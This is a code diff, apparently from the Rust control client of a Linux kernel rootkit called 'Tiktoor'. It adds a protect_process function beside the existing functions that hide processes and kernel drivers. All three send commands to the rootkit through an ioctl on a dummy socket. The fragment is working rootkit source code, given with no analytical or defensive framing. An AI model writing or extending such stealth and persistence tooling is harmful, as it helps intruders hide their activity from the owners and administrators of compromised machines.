@@ -25,6 +25,11 @@ struct ProcessHidingSubargs {
     pid: c_uint,
 }
 
+#[repr(C)]
+struct ProcessProtectingSubargs {
+    pid: c_uint,
+}
+
 /// Hide process given by its pid
 pub fn hide_process(pid: u32) {
     let subargs = ProcessHidingSubargs { pid };
@@ -52,6 +57,23 @@ pub fn hide_driver(rank: u32) {
     let subargs = DriverHidingSubargs { rank };
     let cmd_arg = TiktoorCmdArg {
         action: Action::DriverHiding as c_uchar,
+        subargs: &subargs as *const _ as *const c_void,
+    };
+    unsafe {
+        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
+        libc::ioctl(
+            dummy_socket,
+            TIKTOOR_IOCTL_CMD,
+            &cmd_arg as *const _ as *const c_void,
+        );
+    }
+}
+
+/// Protect process given by its pid
+pub fn protect_process(pid: u32) {
+    let subargs = ProcessHidingSubargs { pid };
+    let cmd_arg = TiktoorCmdArg {
+        action: Action::ProcessProtection as c_uchar,
         subargs: &subargs as *const _ as *const c_void,
     };
     unsafe {
